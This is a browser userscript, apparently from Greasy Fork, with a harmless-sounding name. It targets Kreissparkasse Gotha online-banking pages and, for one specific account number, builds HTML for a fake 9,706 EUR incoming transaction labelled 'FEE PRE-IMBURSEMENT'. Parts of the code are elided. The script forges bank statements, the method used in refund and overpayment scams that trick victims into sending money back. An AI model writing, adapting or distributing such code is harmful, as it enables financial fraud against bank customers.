// ==UserScript==
// @name         Vertragssignature Wolfersdorf
...
// @match        https://www.kreissparkasse-gotha.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.kreissparkasse-gotha.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.kreissparkasse-gotha.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/462423/Vertragssignature%20Wolfersdorf.user.js
// @updateURL https://update.greasyfork.org/scripts/462423/Vertragssignature%20Wolfersdorf.meta.js
// ==/UserScript==
...
(function() {
    ...
    if (window.location.href.indexOf("umsaetze") > 0) {
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == "1600 0497 25" ){
            ...
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 9.706,00 EUR"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Matthias Kabisch">Matthias Kabisch</a></h3><p>9.706,- EURO FEE PRE-IMBURSEMENT</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">9.706</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">15.308,00 EUR</span></div></div></div></div></li>';
